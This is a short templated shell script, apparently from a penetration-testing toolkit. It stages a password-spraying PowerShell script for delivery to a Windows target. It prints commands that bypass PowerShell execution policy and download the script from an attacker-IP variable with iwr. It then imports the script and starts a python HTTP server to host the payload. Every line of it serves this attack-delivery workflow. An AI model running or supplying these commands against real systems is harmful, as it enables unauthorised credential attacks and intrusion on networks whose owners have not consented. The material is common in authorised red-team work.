mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/powershell/spray-passwords.ps1 packstation/outbound; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Preparation: powershell -ep bypass'; \
echo 'Deliver & Import: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/spray-passwords.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\spray-passwords.ps1; Import-Module <%=$(esh variables/delivery_path_windows)%>\spray-passwords.ps1'; \
echo '================================================================'; \
echo '                         -----CMD-----                          '; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
